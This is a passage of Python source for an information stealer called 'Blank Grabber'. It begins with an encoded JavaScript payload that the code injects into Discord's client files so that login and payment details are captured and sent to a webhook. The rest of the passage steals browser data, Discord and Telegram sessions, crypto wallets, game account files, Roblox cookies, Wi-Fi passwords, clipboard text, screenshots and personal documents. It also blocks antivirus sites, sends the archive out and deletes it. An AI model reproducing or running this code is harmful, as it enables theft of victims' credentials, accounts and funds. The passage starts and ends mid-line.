oVFsnZW1haWwnXSxUW3g3KDB4OGUpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTtUW3g3KDB4MTNiKV0mJnBhc3N3b3JkQ2hhbmdlZChUW3g3KDB4OGUpXSxUW3g3KDB4MTNiKV0sSClbJ2NhdGNoJ10oY29uc29sZVsnZXJyb3InXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oeDcoMHhkNikpJiZZWydtZXRob2QnXT09PXg3KDB4YmYpOmNvbnN0IFY9cXVlcnlzdHJpbmdbJ3BhcnNlJ10odW5wYXJzZWREYXRhW3g3KDB4ZTApXSgpKTtjY0FkZGVkKFZbJ2NhcmRbbnVtYmVyXSddLFZbeDcoMHgxNDkpXSxWW3g3KDB4ZWQpXSxWW3g3KDB4ODMpXSxIKVt4NygweDEwMSldKGNvbnNvbGVbeDcoMHg3ZildKTticmVhaztjYXNlIFlbJ3VybCddW3g3KDB4YTIpXSh4NygweGYxKSkmJllbeDcoMHhiMildPT09eDcoMHhiZik6UGF5cGFsQWRkZWQoSClbeDcoMHgxMDEpXShjb25zb2xlW3g3KDB4N2YpXSk7YnJlYWs7Y2FzZSBZW3g3KDB4NzMpXVt4NygweGEyKV0oJ2NvbmZpcm0nKSYmWVt4NygweGIyKV09PT14NygweGJmKTppZighY29uZmlnW3g3KDB4MTBhKV0pcmV0dXJuO3NldFRpbWVvdXQoKCk9Pntjb25zdCB4OD14NztuaXRyb0JvdWdodChIKVt4OCgweDEwMSldKGNvbnNvbGVbeDgoMHg3ZildKTt9LDB4MWQ0Yyk7YnJlYWs7ZGVmYXVsdDpicmVhazt9fSksbW9kdWxlW1MoMHgxMmQpXT1yZXF1aXJlKFMoMHgxMDcpKTs=').decode(
                    errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
            except Exception:
                return None
            for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
                path = os.path.join(os.getenv('localappdata'), dirname)
                if not os.path.isdir(path):
                    continue
                for root, _, files in os.walk(path):
                    for file in files:
                        if file.lower() == 'index.js':
                            filepath = os.path.realpath(
                                os.path.join(root, file))
                            if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                                with open(filepath, 'w', encoding='utf-8') as file:
                                    file.write(code)
                                check = True
                if check:
                    check = False
                    yield path

    class BlankGrabber:
        Separator: str = None
        TempFolder: str = None
        ArchivePath: str = None
        Cookies: list = []
        PasswordsCount: int = 0
        HistoryCount: int = 0
        AutofillCount: int = 0
        RobloxCookiesCount: int = 0
        DiscordTokensCount: int = 0
        WifiPasswordsCount: int = 0
        MinecraftSessions: int = 0
        WebcamPicturesCount: int = 0
        TelegramSessionsCount: int = 0
        CommonFilesCount: int = 0
        WalletsCount: int = 0
        ScreenshotTaken: bool = False
        SystemInfoStolen: bool = False
        SteamStolen: bool = False
        EpicStolen: bool = False
        UplayStolen: bool = False
        GrowtopiaStolen: bool = False

        def __init__(self) -> None:
            self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
            while True:
                self.ArchivePath = os.path.join(
                    os.getenv('temp'), Utility.GetRandomString() + '.zip')
                if not os.path.isfile(self.ArchivePath):
                    break
            Logger.info('Creating temporary folder')
            while True:
                self.TempFolder = os.path.join(
                    os.getenv('temp'), Utility.GetRandomString(10, True))
                if not os.path.isdir(self.TempFolder):
                    os.makedirs(self.TempFolder, exist_ok=True)
                    break
            for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
                thread = Thread(target=func, daemon=daemon)
                thread.start()
                Tasks.AddTask(thread)
            Tasks.WaitForAll()
            Logger.info('All functions ended')
            if Errors.errors:
                with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                    file.write('# This file contains the errors handled successfully during the functioning of the stealer.' +
                               '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
            self.SendData()
            try:
                Logger.info('Removing archive')
                os.remove(self.ArchivePath)
                Logger.info('Removing temporary folder')
                shutil.rmtree(self.TempFolder)
            except Exception:
                pass

        @Errors.Catch
        def StealCommonFiles(self) -> None:
            if Settings.CaptureCommonFiles:
                for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                    if os.path.isdir(dir):
                        file: str
                        for file in os.listdir(dir):
                            if os.path.isfile(os.path.join(dir, file)):
                                if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
                                    try:
                                        os.makedirs(os.path.join(
                                            self.TempFolder, 'Common Files', name), exist_ok=True)
                                        shutil.copy(os.path.join(dir, file), os.path.join(
                                            self.TempFolder, 'Common Files', name, file))
                                        self.CommonFilesCount += 1
                                    except Exception:
                                        pass

        @Errors.Catch
        def StealMinecraft(self) -> None:
            if Settings.CaptureGames:
                Logger.info('Stealing Minecraft related files')
                saveToPath = os.path.join(
                    self.TempFolder, 'Games', 'Minecraft')
                userProfile = os.getenv('userprofile')
                roaming = os.getenv('appdata')
                minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'),
                                  'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
                for name, path in minecraftPaths.items():
                    if os.path.isfile(path):
                        try:
                            os.makedirs(os.path.join(
                                saveToPath, name), exist_ok=True)
                            shutil.copy(path, os.path.join(
                                saveToPath, name, os.path.basename(path)))
                            self.MinecraftSessions += 1
                        except Exception:
                            continue

        @Errors.Catch
        def StealGrowtopia(self) -> None:
            if Settings.CaptureGames:
                Logger.info('Stealing Growtopia session')
                growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v)
                                                                    for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
                saveToPath = os.path.join(
                    self.TempFolder, 'Games', 'Growtopia')
                multiple = len(growtopiadirs) > 1
                for index, path in enumerate(growtopiadirs):
                    targetFilePath = os.path.join(path, 'save.dat')
                    if os.path.isfile(targetFilePath):
                        try:
                            _saveToPath = saveToPath
                            if multiple:
                                _saveToPath = os.path.join(
                                    saveToPath, 'Profile %d' % (index + 1))
                            os.makedirs(_saveToPath, exist_ok=True)
                            shutil.copy(targetFilePath, os.path.join(
                                _saveToPath, 'save.dat'))
                            self.GrowtopiaStolen = True
                        except Exception:
                            shutil.rmtree(_saveToPath)
                if multiple and self.GrowtopiaStolen:
                    with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                        file.write(
                            'Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')

        @Errors.Catch
        def StealEpic(self) -> None:
            if Settings.CaptureGames:
                Logger.info('Stealing Epic session')
                saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
                epicPath = os.path.join(
                    os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
                if os.path.isdir(epicPath):
                    loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                    if os.path.isfile(loginFile):
                        with open(loginFile) as file:
                            contents = file.read()
                        if '[RememberMe]' in contents:
                            try:
                                os.makedirs(saveToPath, exist_ok=True)
                                for file in os.listdir(epicPath):
                                    if os.path.isfile(os.path.join(epicPath, file)):
                                        shutil.copy(os.path.join(
                                            epicPath, file), os.path.join(saveToPath, file))
                                shutil.copytree(
                                    epicPath, saveToPath, dirs_exist_ok=True)
                                self.EpicStolen = True
                            except Exception:
                                pass

        @Errors.Catch
        def StealSteam(self) -> None:
            if Settings.CaptureGames:
                Logger.info('Stealing Steam session')
                saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
                steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v)
                                                                 for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
                multiple = len(steamPaths) > 1
                if not steamPaths:
                    steamPaths.append('C:\\Program Files (x86)\\Steam')
                for index, steamPath in enumerate(steamPaths):
                    steamConfigPath = os.path.join(steamPath, 'config')
                    if os.path.isdir(steamConfigPath):
                        loginFile = os.path.join(
                            steamConfigPath, 'loginusers.vdf')
                        if os.path.isfile(loginFile):
                            with open(loginFile) as file:
                                contents = file.read()
                            if '"RememberPassword"\t\t"1"' in contents:
                                try:
                                    _saveToPath = saveToPath
                                    if multiple:
                                        _saveToPath = os.path.join(
                                            saveToPath, 'Profile %d' % (index + 1))
                                    os.makedirs(_saveToPath, exist_ok=True)
                                    shutil.copytree(steamConfigPath, os.path.join(
                                        _saveToPath, 'config'), dirs_exist_ok=True)
                                    for item in os.listdir(steamPath):
                                        if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
                                            shutil.copy(os.path.join(
                                                steamPath, item), os.path.join(_saveToPath, item))
                                            self.SteamStolen = True
                                except Exception:
                                    pass
                if self.SteamStolen and multiple:
                    with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
                        file.write(
                            'Multiple Steam installations are found, so the files for each of them are put in different Profiles')

        @Errors.Catch
        def StealUplay(self) -> None:
            if Settings.CaptureGames:
                Logger.info('Stealing Uplay session')
                saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
                uplayPath = os.path.join(
                    os.getenv('localappdata'), 'Ubisoft Game Launcher')
                if os.path.isdir(uplayPath):
                    for item in os.listdir(uplayPath):
                        if os.path.isfile(os.path.join(uplayPath, item)):
                            os.makedirs(saveToPath, exist_ok=True)
                            shutil.copy(os.path.join(uplayPath, item),
                                        os.path.join(saveToPath, item))
                            self.UplayStolen = True

        @Errors.Catch
        def StealRobloxCookies(self) -> None:
            if Settings.CaptureGames:
                Logger.info('Stealing Roblox cookies')
                saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
                note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
                cookies = []
                browserCookies = '\n'.join(self.Cookies)
                for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
                    cookies.append(match)
                output = list()
                for item in ('HKCU', 'HKLM'):
                    process = subprocess.run(
                        'powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
                    if not process.returncode:
                        output.append(process.stdout.decode(errors='ignore'))
                for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
                    cookies.append(match)
                cookies = [*set(cookies)]
                if cookies:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                        file.write('{}{}{}'.format(note, self.Separator,
                                                   self.Separator.join(cookies)))
                    self.RobloxCookiesCount += len(cookies)

        @Errors.Catch
        def StealWallets(self) -> None:
            if Settings.CaptureWallets:
                Logger.info('Stealing crypto wallets')
                saveToDir = os.path.join(self.TempFolder, 'Wallets')
                wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(
                    os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
                browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(
                    os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
                for name, path in wallets:
                    if os.path.isdir(path):
                        _saveToDir = os.path.join(saveToDir, name)
                        os.makedirs(_saveToDir, exist_ok=True)
                        try:
                            shutil.copytree(path, os.path.join(
                                _saveToDir, os.path.basename(path)), dirs_exist_ok=True)
                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                file.write(path)
                            self.WalletsCount += 1
                        except Exception:
                            try:
                                shutil.rmtree(_saveToDir)
                            except Exception:
                                pass
                for name, path in browserPaths.items():
                    if os.path.isdir(path):
                        for root, dirs, _ in os.walk(path):
                            for _dir in dirs:
                                if _dir == 'Local Extension Settings':
                                    localExtensionsSettingsDir = os.path.join(
                                        root, _dir)
                                    for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
                                        extentionPath = os.path.join(
                                            localExtensionsSettingsDir, _dir)
                                        if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                            try:
                                                metamask_browser = os.path.join(
                                                    saveToDir, 'Metamask ({})'.format(name))
                                                _saveToDir = os.path.join(
                                                    metamask_browser, _dir)
                                                shutil.copytree(
                                                    extentionPath, _saveToDir, dirs_exist_ok=True)
                                                with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
                                                    file.write(extentionPath)
                                                self.WalletsCount += 1
                                            except Exception:
                                                try:
                                                    shutil.rmtree(_saveToDir)
                                                    if not os.listdir(metamask_browser):
                                                        shutil.rmtree(
                                                            metamask_browser)
                                                except Exception:
                                                    pass

        @Errors.Catch
        def StealSystemInfo(self) -> None:
            if Settings.CaptureSystemInfo:
                Logger.info('Stealing system information')
                saveToDir = os.path.join(self.TempFolder, 'System')
                process = subprocess.run(
                    'systeminfo', capture_output=True, shell=True)
                output = process.stdout.decode(
                    errors='ignore').strip().replace('\r\n', '\n')
                if output:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
                        file.write(output)
                    self.SystemInfoStolen = True
                process = subprocess.run(
                    'getmac', capture_output=True, shell=True)
                output = process.stdout.decode(
                    errors='ignore').strip().replace('\r\n', '\n')
                if output:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
                        file.write(output)
                    self.SystemInfoStolen = True

        @Errors.Catch
        def GetDirectoryTree(self) -> None:
            if Settings.CaptureSystemInfo:
                Logger.info('Getting directory trees')
                PIPE = chr(9474) + '   '
                TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
                ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
                output = {}
                for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
                    if os.path.isdir(dir):
                        dircontent: list = os.listdir(dir)
                        if 'desltop.ini' in dircontent:
                            dircontent.remove('desktop.ini')
                        if dircontent:
                            process = subprocess.run(
                                'tree /A /F', shell=True, capture_output=True, cwd=dir)
                            if process.returncode == 0:
                                output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[
                                                3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
                for key, value in output.items():
                    os.makedirs(os.path.join(self.TempFolder,
                                'Directories'), exist_ok=True)
                    with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
                        file.write(value)
                    self.SystemInfoStolen = True

        @Errors.Catch
        def GetClipboard(self) -> None:
            if Settings.CaptureSystemInfo:
                Logger.info('Getting clipboard text')
                saveToDir = os.path.join(self.TempFolder, 'System')
                process = subprocess.run(
                    'powershell Get-Clipboard', shell=True, capture_output=True)
                if process.returncode == 0:
                    content = process.stdout.decode(errors='ignore').strip()
                    if content:
                        os.makedirs(saveToDir, exist_ok=True)
                        with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
                            file.write(content)

        @Errors.Catch
        def GetAntivirus(self) -> None:
            if Settings.CaptureSystemInfo:
                Logger.info('Getting antivirus')
                saveToDir = os.path.join(self.TempFolder, 'System')
                process = subprocess.run(
                    'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
                if process.returncode == 0:
                    output = process.stdout.decode(
                        errors='ignore').strip().replace('\r\n', '\n').splitlines()
                    if len(output) >= 2:
                        output = output[1:]
                        os.makedirs(saveToDir, exist_ok=True)
                        with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                            file.write('\n'.join(output))

        @Errors.Catch
        def GetTaskList(self) -> None:
            if Settings.CaptureSystemInfo:
                Logger.info('Getting task list')
                saveToDir = os.path.join(self.TempFolder, 'System')
                process = subprocess.run(
                    'tasklist /FO LIST', capture_output=True, shell=True)
                output = process.stdout.decode(
                    errors='ignore').strip().replace('\r\n', '\n')
                if output:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
                        tasklist.write(output)

        @Errors.Catch
        def GetWifiPasswords(self) -> None:
            if Settings.CaptureWifiPasswords:
                Logger.info('Getting wifi passwords')
                saveToDir = os.path.join(self.TempFolder, 'System')
                passwords = Utility.GetWifiPasswords()
                profiles = list()
                for profile, psw in passwords.items():
                    profiles.append(f'Network: {profile}\nPassword: {psw}')
                if profiles:
                    os.makedirs(saveToDir, exist_ok=True)
                    with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                        file.write(self.Separator.lstrip() +
                                   self.Separator.join(profiles))
                    self.WifiPasswordsCount += len(profiles)

        @Errors.Catch
        def TakeScreenshot(self) -> None:
            if Settings.CaptureScreenshot:
                Logger.info('Taking screenshot')
                command = 'JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA='
                if subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', command], shell=True, capture_output=True, cwd=self.TempFolder).returncode == 0:
                    self.ScreenshotTaken = True

        @Errors.Catch
        def BlockSites(self) -> None:
            if Settings.BlockAvSites:
                Logger.info('Blocking AV sites')
                Utility.BlockSites()
                Utility.TaskKill('chrome', 'firefox', 'msedge',
                                 'safari', 'opera', 'iexplore')

        @Errors.Catch
        def StealBrowserData(self) -> None:
            if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory or Settings.CaptureAutofills)):
                return
            Logger.info('Stealing browser data')
            threads: list[Thread] = []
            paths = {'Brave': (os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'brave'), 'Chrome': (os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'chrome'), 'Chromium': (os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'chromium'), 'Comodo': (os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'comodo'), 'Edge': (os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'msedge'), 'EpicPrivacy': (os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'epic'), 'Iridium': (os.path.join(
